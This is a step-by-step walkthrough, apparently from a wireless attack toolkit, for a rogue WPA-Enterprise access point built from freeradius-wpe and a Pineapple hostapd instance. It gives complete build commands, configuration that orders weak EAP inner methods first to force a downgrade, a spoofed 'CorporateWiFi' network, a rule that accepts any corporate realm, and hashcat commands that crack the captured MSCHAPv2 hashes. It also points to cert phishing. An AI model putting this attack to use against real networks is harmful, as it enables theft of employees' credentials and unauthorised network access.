# freeradius-wpe — walkthrough

Build the WPE-patched freeradius, wire it to a Pineapple hostapd
instance, harvest MSCHAPv2 / GTC / PAP inner material.

## Preconditions

- Linux host (Kali is easiest); freeradius-wpe on the Pineapple
  directly is possible but painful.
- Root privileges.
- The Pineapple's hostapd config already points its `auth_server_addr`
  at your host's IP.

## Path A — Build and install freeradius-wpe

```
# Debian/Ubuntu
apt install build-essential libssl-dev libtalloc-dev libkqueue-dev

git clone https://github.com/joswr1ght/freeradius-wpe    # community fork
cd freeradius-wpe
./configure --prefix=/opt/freeradius-wpe
make -j"$(nproc)"
sudo make install
```

Config lives under `/opt/freeradius-wpe/etc/raddb/`.

## Path B — Configure the "wpe" site

```
cd /opt/freeradius-wpe/etc/raddb

# Enable WPE site + module
ln -s ../sites-available/wpe sites-enabled/wpe
ln -s ../mods-available/eap_wpe mods-enabled/eap_wpe

# Set the shared secret so hostapd can talk to us.
cat > clients.conf <<EOF
client pineapple {
    ipaddr = 172.16.42.1
    secret = testing123
}
client localhost {
    ipaddr = 127.0.0.1
    secret = testing123
}
EOF

# EAP methods enabled by default in the WPE fork:
#   MD5, MSCHAPv2, PEAP, TTLS, TLS.
# Weak inner methods are ordered first so the client-side
# downgrade attack succeeds.
```

## Path C — Launch and point hostapd at it

```
# In a foreground shell for debug:
sudo /opt/freeradius-wpe/sbin/radiusd -X

# In another shell, on the Pineapple:
cat > /tmp/rogue-eap.conf <<EOF
interface=wlan1
ssid=CorporateWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
rsn_pairwise=CCMP
auth_server_addr=<your-laptop-IP>
auth_server_port=1812
auth_server_shared_secret=testing123
EOF
hostapd /tmp/rogue-eap.conf
```

When a client associates and starts EAP, both freeradius-wpe and
hostapd log the exchange.

## Path D — Read the harvest

```
tail -F /var/log/freeradius-wpe.log
```

Look for hashcat / John / plaintext-token lines. Pipe MSCHAPv2 hash
lines into `hashcat -m 5500`:

```
grep 'hashcat -m 5500' /var/log/freeradius-wpe.log \
  | awk -F': ' '{print $2}' > /tmp/mschap.hashes
hashcat -m 5500 /tmp/mschap.hashes rockyou.txt -w 4
```

## Path E — Fake-realm forwarding

To catch clients that try to authenticate to their *real* corporate
realm and fall back to us on failure:

```
# In sites-enabled/wpe:
authorize {
    ...
    if (User-Name =~ /@(corp\.local|acme\.example)$/) {
        # Log the identity, accept in the tunnel anyway.
        update reply { WPE-Identity := "%{User-Name}" }
    }
}
```

Every realm hits the same permissive tunnel; realm-identity is
logged with the credentials.

## Failure modes

- **Client rejects the cert.** Rewrite `raddb/certs/server.pem` with
  a matching CN. See `enterprise/walkthrough.md` for cert phishing.
- **freeradius-wpe fails to start with "eap: rlm_eap: No EAP
  method configured".** The WPE module is disabled. `ln -s` in
  `mods-enabled/eap_wpe`.
- **Nothing logs even though hostapd shows EAP frames.** Shared
  secret mismatch or firewall dropping 1812/UDP.

## Cite

- freeradius-wpe community fork (joswr1ght / brad-anton lineage).
- freeradius.org upstream docs.
- Gabriel Ryan — eaphammer talks.
- Wright — asleap; hacking-exposed-wireless-3e.
- attacks.json: `rogue-radius-hostapd-wpe`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-gtc-plaintext-token-capture`.
